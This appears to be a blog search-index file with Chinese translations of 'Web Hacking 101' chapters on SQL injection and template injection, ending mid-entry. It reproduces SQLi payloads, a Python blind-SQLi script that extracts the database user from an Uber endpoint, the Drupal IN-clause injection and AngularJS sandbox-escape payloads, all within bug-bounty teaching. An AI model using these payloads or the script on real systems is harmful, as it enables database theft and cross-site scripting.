<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Part9 SQL注入</title>
      <link href="part9-sql-zhu-ru/"/>
      <url>part9-sql-zhu-ru/</url>
      
        <content type="html"><![CDATA[<h1 id="Part9-SQL注入"><a href="#Part9-SQL注入" class="headerlink" title="Part9 SQL注入"></a><center>Part9 SQL注入</center></h1><p><font color="#A52A2A" size="4"><em>本文部分翻译自《Web Hacking 101》，仅供参考学习，切勿二传。</em></font></p><p>当数据库支持的站点上的漏洞允许攻击者使用<em>SQL</em>查询或攻击站点的数据库（结构化查询语言），称为 SQL注入（SQLi）。通常，SQLi攻击会得到很高的回报，因为它们可能是毁灭性的：攻击者可以操纵或提取信息甚至在数据库中创建管理员登录。</p><h2 id="SQL数据库"><a href="#SQL数据库" class="headerlink" title="SQL数据库"></a>SQL数据库</h2><p>数据库将信息存储在包含在其中的记录和字段中表格的集合。表包含一个或多个列，并且表中的一行代表数据库中的一条记录。用户使用SQL在数据库中来创建，读取，更新和删除记录。用户发送SQL命令到数据库中，并且-命令被接受-数据库解释声明并执行一些操作。流行的SQL数据库包括MySQL，PostgreSQL，MSSQL等。在这个本章中，我们将使用MySQL，但一般概念适用于所有SQL数据库。</p><p>下面是一个服务器的PHP代码在用户访问后生成MySQL命令的理论示例</p><pre class="line-numbers language-none"><code class="language-none">https://www.&lt;example&gt;.com?name=peter: $name = ➊$_GET['name'];$query = "SELECT * FROM users WHERE name = ➋'$name'";➌ mysql_query($query); <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>代码使用<code>$➊GET[]</code>从括号中指定的URL参数获取name值，并将该值存储在$name变量中。然后将参数在未清理的情况下直接传递给$query变量➋。$query变量表示要执行的查询，并从列<code>name</code>与URL参数<code>name </code>中的值匹配的users表中获取所有数据。通过将$query变量传递给PHP函数mysql_query➌来执行查询。</p><p>站点要求名称包含常规文本。但如果用户在URL参数中输入恶意的<code>test'or 1='1</code>，例如<code>https://www.example.com?name=test'or 1='1</code>，执行的查询如下：<code>$query=“SELECT*FROM users WHERE name='test➊”or1='1➋'；</code>。</p><p>SQL使用条件运算符AND和OR。在本例中，SQLi修改WHERE子句以搜索<code>name</code>列与test匹配OR公式<code>1='1'</code>返回true的记录。MySQL将<code>“1”</code>视为整数，因为1总是等于1，所以条件为true，查询将返回users表中的所有记录。但是当查询语句被清理，注入<code>test'or 1='1</code>将不起作用。例如，您可以使用这样的查询：</p><pre class="line-numbers language-none"><code class="language-none">$name=$\u GET['name']；$password=➊mysql_real_escape_string（$GET['password']）；$query=“SELECT*FROM users WHERE name='$name'，password='$password'”；<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>在这种情况下，password参数也是由用户控制的，但经过了正确的清理。如果您使用相同的payload <code>test' or 1='1</code>，假设您的<code>password</code>是12345，则您的语句如下所示：</p><pre class="line-numbers language-none"><code class="language-none">$query=“SELECT*FROM users WHERE name='test' or 1='1'AND password='12345'；<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 查询语句查找<code>name</code>为<code>test or 1='1'</code>且<code>password</code>为12345的所有记录（我们将忽略此数据库存储明文密码的事实，这是另一个漏洞）。因为<code>password</code>检查使用AND运算符，除非记录的<code>password</code>是12345，否则此查询不会返回数据。</p><p>我们需要消除password参数，这可以通过添加<code>;--</code>，例如 <code>test' OR 1='1;--  </code>。这个注入完成了两个任务：分号（；）结束SQL语句，两个破折号（–）告诉数据库文本的其余部分是一个注释。此注入参数将查询更改为<code>SELECT*FROM users WHERE name='test'or 1='1'；</code>。语句中的<code>AND password='12345'</code>代码将成为注释，因此该命令将返回表中的所有记录。当你使用–作为注释，请记住，MySQL在破折号和剩余查询之后需要一个空格。否则，MySQL将在不执行命令的情况下返回错误。</p><h2 id="针对SQLI的对策"><a href="#针对SQLI的对策" class="headerlink" title="针对SQLI的对策"></a>针对SQLI的对策</h2><p>防止SQLi的一个可用保护是使用预处理语句，这是执行重复查询的数据库功能。预处理语句的具体细节超出了本书的范围，但是它们可以防止SQLi，因为查询不再是动态执行的。数据库中查询使用类似于模板的占位符。因此，即使用户向查询未被清理的数据，注入也无法修改数据库的查询模板，从而阻止了SQLi。</p><p>Web框架，比如rubyonrails、Django、Symphony等等，也提供了内置的保护来帮助防止SQLi。但它们并不完美，也无法阻止所有的漏洞。您刚才看到的两个简单的SQLi示例通常不会在使用框架构建的站点上出现，除非站点开发人员没有遵循最佳实践方案，或者没有意识到保护措施不是自动提供的。例如，网站<code>https://railssqli.org/</code>维护着一张由开发人员错误导致的常见SQLi模式的列表。在测试SQLi漏洞时，最好的办法是寻找看起来是定制的或使用不具备当前系统所有内置保护的web框架和内容管理系统的旧网站</p><h2 id="漏洞实例"><a href="#漏洞实例" class="headerlink" title="漏洞实例"></a>漏洞实例</h2><h3 id="Yahoo！Sport的blind-SQLI"><a href="#Yahoo！Sport的blind-SQLI" class="headerlink" title="Yahoo！Sport的blind SQLI"></a>Yahoo！Sport的blind SQLI</h3><p>难点：中等</p><p>URL:<a href="https://sports.yahoo.com/">https://sports.yahoo.com</a></p><p>来源：不适用报告日期：2014年2月16日</p><p>悬赏金：3705美元</p><p>如果可以将SQL语句注入查询，但无法获得查询的直接输出，则会出现Blind SQLi漏洞。利用blind注入的关键是通过比较未修改查询和修改查询的结果来推断信息。</p><p>例如，2014年2月，Stefano Vettorazzi在测试Yahoo！Sport子域时发现了一个blind SQLi！。该页面通过其URL获取参数，查询数据库以获取信息，并根据这些参数返回NFL球员的列表。Vettorazzi 将返回2010年的NFZI的运动员的url从：<code>sports.yahoo.com/nfl/draft? year=2010&amp;type=20&amp;round=2  </code></p><p>改成：</p><p><code>sports.yahoo.com/nfl/draft?year=2010--&amp;type=20&amp;round=2  </code></p><p>Vettorazzi在第二个URL的<code>year</code>参数中添加了两个破折号（–）。图9-1显示了在加上两个破折号之前的结果。图9-2显示了Vettorazzi添加破折号后的结果。图9-1中返回的运动员与图9-2的结果不同。我们看不到实际的查询，因为代码在网站的后端。但是原始查询很可能将每个URL参数传递给同一个SQL查询，该查询如下所示：<code>SELECT*FROM players WHERE year=2010 AND type=20 AND round=2</code>；通过在<code>year</code>参数中添加两个破折号，Vettorazzi将把查询改为：<code>SELECT*FROM players WHERE year=2010--type=20 AND round=2；</code></p><p><img src="/part9-sql-zhu-ru/Part9-SQL%E6%B3%A8%E5%85%A5%5C9-1.png"></p><center>图9-1：不修改参数时的搜索结果</center><p><img src="/part9-sql-zhu-ru/Part9-SQL%E6%B3%A8%E5%85%A5%5C9-2.png"></p><center>图9-2：修改参数后的搜索结果</center><p>这个bug有点不寻常，因为在大多数数据库中，查询必须以分号结尾。因为Vettorazzi只注入了两个破折号并注释掉了查询的分号，所以这个查询应该失败，要么返回一个错误，要么没有记录。有些数据库可以允许没有分号的查询，所以Yahoo！应该是使用此功能或其代码以其他方式容纳了错误。不管怎样，在Vettorazzi识别出查询返回的不同结果后，他试图通过提交以下代码作为year参数来推断站点使用的数据库版本：<code>(2010)AND(if（mid（version（），1,1））='5'，true，false))--</code></p><p><code>version</code>函数的作用是：返回正在使用的MySQL数据库的当前版本。<code>mid</code>函数根据第二个和第三个参数返回传递给第一个参数的字符串的一部分。第二个参数指定函数将返回的子字符串的起始位置，第三个参数指定子字符串的长度。通过调用<code>version()</code>检查站点是否使用MySQL。然后，他试图通过传递给mid函数1作为起始位置的第一个参数，并将1作为子字符串长度的第二个参数来获取版本号中的第一个数字。代码使用if语句检查MySQL版本的第一个数字。</p><p>if语句有三个参数：逻辑检查、检查为真时要执行的操作以及检查为false时要执行的操作。在本例中，代码检查版本的第一个数字是否为5；如果是，则查询返回true。否则，查询返回false。</p><p>然后，Vettorazzi使用and运算符将true/false输出与year参数连接起来，因此，如果MySQL数据库的主要版本是5，那么将返回2010年的运动员的名单。Vettorazzi执行了查询，没有收到任何记录，如图9-3所示，这意味着从version函数返回的值的第一位不是5。</p><p><img src="/part9-sql-zhu-ru/Part9-SQL%E6%B3%A8%E5%85%A5%5C9-3.png"></p><center>图9-3：运动员搜索结果为空</center><p>这个bug是一个盲目的SQLi，因为注入的查询不能直接在页面上看到输出。但是Vettorazzi仍然可以找到关于这个网站的信息。通过插入布尔检查，例如版本检查if语句，Vettorazzi可以推断出他需要的信息。</p><p><strong>重点</strong></p><p>与其他注入漏洞一样，SQLi漏洞并不总是很难发现。找到SQLi漏洞的一种方法是测试URL参数并查找查询结果的细微变化。在本例中，添加双短划线更改了查询的结果，显示了SQLi。</p><h3 id="Uber-blind-SQLI"><a href="#Uber-blind-SQLI" class="headerlink" title="Uber blind SQLI"></a>Uber blind SQLI</h3><p>难点：中等</p><p>URL: <code>http://sctrack.email.uber.com.cn/track/unsubscribe.do/</code></p><p>资料来源：<a href="https://hackerone.com/reports/150156/">https://hackerone.com/reports/150156/</a></p><p>报告日期：2016年7月8日</p><p>赏金：4000美元</p><p>除了网页，您还可以在其他地方发现blind SQLi漏洞，例如电子邮件链接。2016年7月，Orange Tsai收到优步的邮件广告。他注意到unsubscribe链接包含一个base64编码的字符串作为URL参数。链接如下所示：</p><p><code>http://sctrack.email.uber.com.cn/track/unsubscribe.do?p=EYJ1C2Vyx2lkijogjju3ntuilcaicmvjzwl2zxiioiaib3jhbmdlqg15bwpbcj9</code></p><p>解码p参数值</p><p><code>EYJ1C2VYX2LKIJOGIJU3NTUILCMVJZWL2ZXIIOIAIB3JHBMDLQG15BWFPBCJ9</code></p><p>使用base64返回JSON字符串{“user_id”：“5755”，“receiver”：”orange@myemail”}. 对于解码后的字符串，Orange将代码和<code>sleep（12）=1</code>添加到解码后URL参数p中。这个无害的添加使得数据库需要更长的时间来响应取消订阅操作<code>{“user_id”：“5755 and sleep（12）=1”，“receiver”：orange@myemail"}. </code>如果站点存在漏洞，则查询执行<code>sleep（12）</code>，并在将sleep命令的输出与1进行比较之前12秒内不执行任何操作。在MySQL中，sleep命令通常返回0，因此此比较将失败。但这并不重要，因为处理至少需要12秒。</p><p>Orange重新编码payload并将其传递给URL参数，他访问了退订链接以确认HTTP反应至少花了12秒。意识到他需要更具体的SQLi证据才能发送给Uber，于是他使用暴力删除了用户名、主机名和数据库名。通过这样做，他证明了他可以在不访问机密数据的情况下从SQLi漏洞中提取信息。</p><p>SQL函数以<code>&lt;user&gt;@&lt;host&gt;</code>的形式调用user返回数据库的用户名和主机名。因为Orange不能访问他注入的查询的输出，所以他不能调用user。但Orange修改了他的查询，在查询查找用户ID时添加了一个条件检查，使用<code>mid</code>函数一次比较数据库用户名和主机名字符串的一个字符。类似于雅虎！Sports blind SQLi漏洞在之前的bug报告中，Orange使用了一个比较语句和暴力来推断用户名和主机名字符串的每个字符。</p><p>例如，Orange使用mid函数从用户函数返回值的第一个字符。他比较了这个字符是否等于“a”，然后是“b”，然后是“c”，依此类推。如果比较语句为true，服务器将执行取消订阅命令。这个结果表明，用户函数返回值的第一个字符等于它被比较的字符。如果语句为false，服务器将不会尝试取消订阅Orange。通过使用此方法检查用户函数返回值的每个字符，Orange最终可以推断出整个用户名和主机名。</p><p>手动强制字符串需要时间，所以Orange创建了一个Python脚本生成并提交给Uber的有payload如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">import jsonimport stringimport requestsfrom urllib import quotefrom base64 import b64encode➋ base = string.digits + string.letters + '_-@.'➌ payload = {"user_id": 5755, "receiver": "blog.orange.tw"}➍ for l in range(0, 30):➎ for i in base:➏ payload['user_id'] = "5755 and mid(user(),%d,1)='%c'#"%(l+1, i)➐ new_payload = json.dumps(payload)new_payload = b64encode(new_payload)r = requests.get('http://sctrack.email.uber.com.cn/track/unsubscribe.do?p='+quote(new_payload))➑ if len(r.content)&gt;0:print i,break<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Python脚本从五行import语句开始，这些语句检索Orange处理HTTP请求、JSON和字符串编码所需的库。数据库用户名和主机名可以由大写字母、小写字母、数字、连字符（-）、下划线（\）、at符号（@）或句点（.）组成。在➋处，Orange创建基变量来保存这些字符。➌处的代码创建一个变量来保存脚本发送到服务器的payload。➏处的代码行是注入，它使用for循环➎。</p><p>让我们详细看看➏处的代码。Orange引用他的用户ID 5755，并使用在➌中定义的字符串user_ID来创建他的payload。他使用mid函数和字符串处理构造一个类似于本章前面的bug。payload中的<code>%d</code>和<code>%c</code>是字符串替换占位符。%d是表示数字的数据，%c是字符数据。</p><p>payload字符串从第一对双引号（“）开始，在第三个百分号位于➏之前的第二对双引号结束。第三个百分比符号告诉Python将%d和%c占位符替换为括号中百分比符号后面的值。因此，代码用<code>l+1</code>（变量l加上数字1）替换<code>%d</code>，用变量<code>i</code>替换<code>%c</code>。哈希标记（#）是MySQL中注释的另一种方式，它在Orange注入注释之后呈现查询的任何部分。</p><p><code>l</code>和<code>i</code>变量是位于➍和➎的循环迭代器。代码第一次在范围（0,30）内输入l时，<code>l</code>将为0。<code>l</code>的值是脚本试图强制执行的用户函数返回的用户名和主机名字符串中的位置。一旦脚本在所测试的用户名和主机名字符串中有了位置，代码就会进入一个嵌套循环，循环遍历基字符串中的每个字符。脚本第一次迭代这两个循环时，<code>l</code>为0，<code>i</code>为a。这些值被传递给位于➏的<code>mid</code>函数，以创建payload <code>“5755 and mid（user（），0,1）=‘a’#”</code>。</p><p>在嵌套for循环的下一次迭代中，<code>l</code>的值仍然是0，<code>i</code>将是b，以创建payload <code>“5755 and mid（user（），0,1）=‘b’#”</code>。当循环遍历base中的每个字符以创建有效负载时，位置l将保持不变。</p><p>每次创建新的payload时，以下代码将payload转换为JSON，使用base64encode函数重新编码字符串，并将HTTP请求发送到服务器。➑处的代码检查服务器是否响应消息。如果<code>i</code>中的字符与被测试位置的用户名子字符串匹配，脚本将停止测试该位置的字符，并移动到用户字符串中的下一个位置。嵌套循环中断并返回到位于➍处的循环，该循环以<code>l</code>为增量，测试用户名字符串的下一个位置。</p><p>这个ROC允许Orange确认数据库用户名和主机名<code>sendcloud_@10.9.79.210</code>数据库名为<code>sendcloud</code>（要获得数据库名，请将user替换为位于➏的数据库）。在Uber对该报告的回应证实，其服务器上没有发生SQLi。注入发生在Uber使用的第三方服务器上，但是优步仍然支付报酬。不是所有的赏金计划都能做到。很可能是优步支付赏金是因为该漏洞将允许攻击者从sendcloud数据库转储Uber的所有客户电子邮件地址。尽管您可以像Orange那样编写自己的脚本来从易受攻击的网站转储数据库信息，但您也可以使用自动化工具。</p><p><strong>重点</strong></p><p>注意接受编码参数的HTTP请求。解码并将查询注入请求后，请确保对payload重新编码，以便所有内容仍与服务器期望的编码匹配。</p><p>提取数据库名、用户名和主机名通常是无害的，但请确保它在您正在工作的悬赏程序允许的操作范围内。在某些情况下，sleep命令足以证明。</p><h3 id="DRUPAL-SQLI"><a href="#DRUPAL-SQLI" class="headerlink" title="DRUPAL SQLI"></a>DRUPAL SQLI</h3><p>困难：难</p><p>URL：任何使用7.32版或更早版本的Drupal站点源代码：</p><p>来源：<a href="https://hackerone.com/reports/31756/">https://hackerone.com/reports/31756/</a></p><p>报告日期：2014年10月17日</p><p>悬赏金额：3000美元</p><p>Drupal是一个流行的开源内容管理系统，用于构建网站，类似于Joomla！还有WordPress。它是用PHP编写的，是模块化的，这意味着您可以在Drupal站点上以单元的形式安装新功能。每个Drupal安装都包含Drupal核心，它是一组运行平台的模块。这些核心模块需要连接到数据库，比如MySQL。</p><p>2014年，Drupal向Drupal核心发布了一个紧急安全更新，因为Drupal站点易受SQLi漏洞的攻击，该漏洞很容易被匿名用户滥用。该漏洞的影响将允许攻击者接管任何未修补的Drupal站点。Stefan Horst发现Drupal核心的prepared statement功能中有一个bug，他发现了这个漏洞。</p><p>Drupal的数据库应用程序编程接口（API）中存在Drupal漏洞。drupalapi使用PHP数据对象（PDO）扩展，这是在PHP中访问数据库的接口。接口是一种编程概念，它保证函数的输入和输出，而不定义函数的实现方式。换句话说，PDO隐藏了数据库之间的差异，因此程序员可以使用相同的函数来查询和获取数据，而不管数据库类型是什么。PDO包括对prepared statement的支持。</p><p>Drupal创建了一个数据库API来使用PDO功能。API创建了一个Drupal数据库抽象层，这样开发人员就不必直接用自己的代码查询数据库了。但它们仍然可以使用prepared statement，并将它们的代码用于任何数据库类型。API的细节超出了本书的范围。但是您需要知道，API将生成SQL语句来查询数据库，并且有内置的安全检查来防止SQLi漏洞。</p><p>回想一下，prepared statement可以防止SQLi漏洞，因为攻击者无法使用恶意输入修改查询结构，即使输入未初始化。但是，如果在创建模板时发生了注入，则prepared statement无法防止SQLi漏洞。如果攻击者可以在模板创建过程中注入恶意输入，则他们可以创建自己的恶意prepared statement。Horst发现的漏洞是因为SQL的IN子句查找值列表中存在的值。例如，代码<code>SELECT*FROM users WHERE name IN（'peter'，'paul'，'ringo'）；</code>从users表中选择数据，其中name列中的值是peter、paul或ringo。为了理解IN子句容易发生漏洞的原因，让我们看看Drupal的API背后的代码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">$this-&gt;expandArguments($query, $args);$stmt = $this-&gt;prepareQuery($query);$stmt-&gt;execute($args, $options); <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>expandArguments在负责生成查询的函数中使用。expandArguments生成查询后，将查询传递给prepareQuery，后者生成execute函数执行的准备语句。为了理解此过程的重要性，我们还可以查看expandArguments的相关代码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">--snip--➊ foreach(array_filter($args, `is_array`) as $key =&gt; $data) {➋ $new_keys = array();➌ foreach ($data as $i =&gt; $value) {--snip--➍ $new_keys[$key . '_' . $i] = $value;}--snip--}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个PHP代码使用数组。PHP可以使用关联数组，它显式地按如下方式定义键：[‘red’=&gt;’apple’，’yellow’=&gt;’banana’]。此数组中的键是“red”和“yellow”，数组的值是箭头（=&gt;）右侧的水果。PHP可以使用结构化数组：[‘apple’, ‘banana’]  。结构化数组的键是隐式的，并且基于值在中的位置名单。例如，“apple”的键是0，“banana”的键是1。</p><p>foreach PHP函数在数组上迭代，可以将数组键与其值分开。它还可以将每个键和每个值分配给自己的变量，并将它们传递给一个代码块进行处理。在➊处，foreach获取数组的每个元素，并通过调用<code>array_filter（$args，“is_array”）</code>验证传递给它的值是否为数组。在语句确认它有一个数组值之后，它为foreach循环的每次迭代将数组的每个键分配给<code>$key</code>，将每个值分配给<code>$data</code>。该代码将修改数组中的值以创建占位符，因此位于➋的代码初始化一个新的空数组，以便稍后保存占位符值。</p><p>为了创建占位符，位于➌的代码通过将每个键分配给<code>$i</code>，将每个值分配给<code>$value</code>。然后在➍处，在 ➋处初始化的new _keys 数组保存第一个数组的键和在 ➌处的键连接。代码的预期结果是创建像 name _ 0，name _ 1这样的数据占位符。下面是使用Drupal的db_query函数查询数据库的典型查询：</p><p><code>db query（“SELECT*FROM{users}WHERE name IN（：name）”，array（'：name'=&gt;array（'user1'，'user2'））；</code></p><p>db_query函数接受两个参数：一个包含变量的命名占位符的查询和一个替换这些占位符的值数组。在本例中，占位符为<code>：name</code>，是一个值为<code>“user1”</code>和<code>“user2”</code>的数组。在结构化数组中，“user1”的键是0，“user2”的键是1。当Drupal执行db查询函数时，它调用expandArguments函数，该函数将键连接到每个值。结果查询使用name_0和name_1代替键，如下所示：</p><p><code>SELECT*FROM users WHERE name in（：name_0，：name_1）</code>，</p><p>但当您使用关联数组调用db_query时会出现问题，如以下代码所示：</p><p><code>db_query（“SELECT*FROM{users}where name in（：name）”，array（'：name'=&gt;array（'test）；--'=&gt;'user1'，'test'=&gt;'user2'）；</code></p><p>在本例中，<code>：name</code>是一个数组，其键是<code>'test）；--'和'test'</code>。expandArguments接收到：name数组并对其进行处理以创建查询时，它将生成以下命令：</p><p><code>SELECT*FROM users WHERE name IN（：name_test）；--，：name_test）</code></p><p>我们将注释注入prepared statement中。发生这种情况的原因是expandArguments迭代每个数组元素来构建占位符，但假设它传递的是结构化数组。在第一次迭代中，<code>$i</code>被分配为<code>'test）；--'</code>，<code>$value</code>被分配为<code>'user1'</code>。<code>$key</code>是<code>“：name”</code>，并将其与<code>$i</code>组合在一起会得到<code>name_test）；--</code>。在第二次迭代中，<code>$i</code>被赋值为<code>'test'</code>，<code>$value</code>为<code>'user2'</code>。将<code>$key</code>与<code>$i</code>组合会得到值<code>name_test</code>。</p><p>这种行为允许恶意用户将SQL语句注入依赖于IN子句的Drupal查询中。该漏洞影响Drupal登录功能，使SQLi漏洞变得严重，因为任何站点用户，包括一个匿名用户，可以利用它。更糟糕的是，phpdo默认支持一次执行多个查询的能力。这意味着攻击者可以将其他查询附加到用户登录查询中，以便执行非in子句SQL命令。例如，攻击者可以使用INSERT语句（将记录插入数据库）创建管理用户，然后使用该用户登录网站。</p><p><strong>重点</strong></p><p>这个SQLi漏洞不仅仅是提交一个value和中断一个查询。它需要理解drupalcore的数据库API如何处理IN子句。此漏洞的好处是留心改变传递到站点的输入结构的机会。当URL将name作为参数时，请尝试将[]添加到参数中，以将其更改为数组，并测试网站如何处理它。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>SQLi对于一个站点来说是一个严重的漏洞和危险。如果攻击者发现SQLi，他们可能获得对站点的完全权限。在某些情况下，通过将数据插入到站点上启用管理权限，如Drupal示例中所示。当您查找SQLi漏洞时，请探索可以将未转义单引号或双引号传递到查询的位置。当您发现一个漏洞时，该漏洞存在的迹象可能很微妙，例如blind SQLI。您还应该寻找可以以意外方式将数据传递到站点的位置，例如可以在请求数据中替换数组参数的位置，如Uber blind SQLI中所示。</p>]]></content>
      
      
      <categories>
          
          <category> WebHacking101 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
            <tag> web安全 </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Part8 模板注入</title>
      <link href="part8-mo-ban-zhu-ru/"/>
      <url>part8-mo-ban-zhu-ru/</url>
      
        <content type="html"><![CDATA[<h1 id="Part8-模板注入"><a href="#Part8-模板注入" class="headerlink" title="Part8 模板注入"></a><center>Part8 模板注入</center></h1><p><font color="#A52A2A" size="4"><em>本文部分翻译自《Web Hacking 101》，仅供参考学习，切勿二传。</em></font></p><p>模板引擎是通过在渲染模板时自动在模板中填充占位符来创建动态网站，电子邮件和其他媒体的代码。通过使用占位符，模板引擎允许开发人员分离应用程序和业务逻辑。例如，一个网站可能仅对用户个人资料页面使用一个模板，而对个人资料字段（例如用户名，电子邮件地址和年龄）使用动态占位符。模板引擎通常还提供其他好处，例如用户输入清理功能，简化的HTML生成和易于维护。但是，这些功能无法使模板引擎不受漏洞的影响。</p><p>当引擎在未正确清理用户输入的情况下出现模板注入漏洞时，有时会导致远程执行代码。</p><p>模板注入漏洞有两种类型：服务器端和客户端。</p><h2 id="服务器端模板注入"><a href="#服务器端模板注入" class="headerlink" title="服务器端模板注入"></a>服务器端模板注入</h2><p>在服务器端逻辑中进行注入时，会发生服务器端模板注入（SSTI）漏洞。因为模板引擎与特定的编程语言相关联，所以当注入时，您有时可以从该语言执行任意代码。是否可以执行此操作取决于引擎提供的安全保护以及站点的预防措施。 Python Jinja2引擎允许任意文件访问和远程执行代码，Rails默认使用的Ruby ERB模板引擎也是如此。相反，Shopify的Liquid Engine允许访问有限数量的Ruby方法，以防止完全执行远程代码。其他流行的引擎包括PHP的Smarty和Twig，Ruby的Haml，Mustache等。</p><p>要测试SSTI漏洞，请使用所用引擎的特定语法提交模板表达式。例如，PHP的Smarty模板引擎使用四个大括号<code>{{}}`来表示表达式，而ERB使用尖括号，百分号和等号`&lt;％=％&gt;`的组合。在Smarty上进行注入的典型测试包括提交`{{7 * 7}}<!--％=％--></code>并查找输入会在页面上反射回来的区域（例如表单，URL参数等）。在这种情况下，您需要查找表达式中执行的代码7 * 7渲染的字符49。如果找到49，则说明您已成功插入表达式。</p><p>由于所有模板引擎的语法都不相同，因此您必须了解用于构建要测试的网站的软件。 Wappalyzer和BuiltWith等工具是专门为此目的而设计的。确定软件后，使用该模板引擎的语法提交简单的有payload，例如7 * 7。</p><h2 id="客户端模板注入"><a href="#客户端模板注入" class="headerlink" title="客户端模板注入"></a>客户端模板注入</h2><p>客户端模板引擎中存在客户端模板注入（CSTI）漏洞，这些漏洞是用JavaScript编写的。流行的客户端模板引擎包括谷歌的AngularJS和Facebook的ReactJS。</p><p>因为csti发生在用户的浏览器中，您通常不能使用它们来实现远程代码执行，但是可以将它们用于XSS。然而，实现XSS有时会很困难，需要绕过预防措施，就像SSTI漏洞一样。例如，ReactJS在默认情况下可以很好地防止XSS。当使用ReactJS测试应用程序时，应该在JavaScript文件中搜索函数 dangerouslysetinerhtml，在那里可以控制提供给函数的输入。这故意绕过ReactJS的XSS保护。对于AngularJS，早于1.6的版本包含一个沙盒，它限制对某些JavaScript函数的访问，并防止XSS攻击（要确认AngularJS版本，请在浏览器的开发人员控制台中输入Angular.version）。但道德黑客通常会在1.6版本发布之前发现并发布AngularJS沙盒绕过。以下是Sandbox版本1.3.0到1.5.7的一个流行绕过方法，当您发现AngularJS注入时，您可以提交它：您可以在以下网站找到其他已发布的AngularJS沙盒逃逸<code>https://pastebin.com/xMXwsm0N</code>以及<code>https://jsfiddle.net/89aj1n7m/</code>。</p><pre class="line-numbers language-none"><code class="language-none">{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,alert(1),a')}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>要演示CSTI漏洞的严重性，需要测试您可能执行的代码。尽管您可能能够评估一些JavaScript代码，但有些站点可能有额外的安全机制来防止攻击。例如，我通过使用有payload {4+4}}发现了一个CSTI漏洞，它在使用AngularJS的站点上返回了8。但是当我使用<code>{4*4}}</code>时，文本<code>{44}}</code>被返回，因为站点通过删除星号来清理输入。该字段还删除了特殊字符，如（）和[]，并且最多允许30个字符。综合起来，这些预防措施有效地使CSTI变得毫无用处。</p><h2 id="漏洞实例"><a href="#漏洞实例" class="headerlink" title="漏洞实例"></a>漏洞实例</h2><h3 id="UBER-ANGULARJS模板注入"><a href="#UBER-ANGULARJS模板注入" class="headerlink" title="UBER ANGULARJS模板注入"></a>UBER ANGULARJS模板注入</h3><p>难度：高</p><p>网址：<code>https://developer.uber.com/</code></p><p>资料来源：<a href="https://hackerone.com/reports/125027/">https://hackerone.com/reports/125027/</a></p><p>报告日期：2016年3月22日</p><p>悬赏金：3000美元</p><p>2016年3月，PortSwigger（Burp Suite的创建者）的首席安全研究员James Kettle通过URL在Uber子域中发现了一个CSTI漏洞<code>https://deep.com/docslink?q=wrtz{{7*7}}</code>。</p><p>如果在访问链接后查看呈现的页面源代码，您会发现字符串wrtz49，表明模板计算了表达式7*7。事实证明，developer.uber.com使用AngularJS呈现其网页。您可以通过使用wappayzer或BuiltWith之类的工具或者通过查看页面源代码并查找ng-HTML属性来确认这一点。如前所述，</p><p>早期版本的AngularJS实现了一个沙盒，但是Uber使用的版本容易受到沙盒越狱的攻击。所以在本例中，CSTI漏洞意味着您可以执行XSS。</p><p>在Uber URL中使用以下JavaScript，Kettle逃离了AngularJS沙盒并执行了alert函数：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>developer<span class="token punctuation">.</span>uber<span class="token punctuation">.</span>com<span class="token operator">/</span>docs<span class="token operator">/</span>deep<span class="token operator">-</span>linking<span class="token operator">?</span>q<span class="token operator">=</span>wrtz<span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token punctuation">(</span>_<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">.</span>sub<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">[</span>$<span class="token operator">=</span><span class="token string">"constructor"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">getOwnPropertyDescriptor</span><span class="token punctuation">(</span>_<span class="token punctuation">.</span>__proto__<span class="token punctuation">,</span>$<span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"alert(1)"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>zzzz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>考虑到大量AngularJS沙盒逃逸的发布和版本1.6中沙盒的移除，解构这个payload超出了本书的范围。但是<code>alert(1)</code>的最终结果是JavaScript弹出窗口。这个ROC向Uber证明，攻击者可以利用这个CSTI来实现XSS，从而导致开发人员帐户和相关应用程序受损。</p><p><strong>重点</strong></p><p>在确认站点是否使用客户端模板引擎之后，开始测试站点，方法是使用与引擎相同的语法提交简单的有效负载，例如AngularJS的<code>{{7*7}}</code>，并观察呈现的结果。如果执行payload，请检查站点使用的AngularJS版本，通过在浏览器控制台中键入Angular.version。如果版本大于1.6，则可以从上述资源提交payload，而无需绕过沙盒。如果它小于1.6，你需要提交一个沙盒绕过。</p><h3 id="UBER-FLASK-JINJA2-模板注入"><a href="#UBER-FLASK-JINJA2-模板注入" class="headerlink" title="UBER FLASK JINJA2  模板注入"></a>UBER FLASK JINJA2  模板注入</h3><p>难度：中等</p><p>网址：<code>https://riders.uber.com/</code></p><p>资料来源：<a 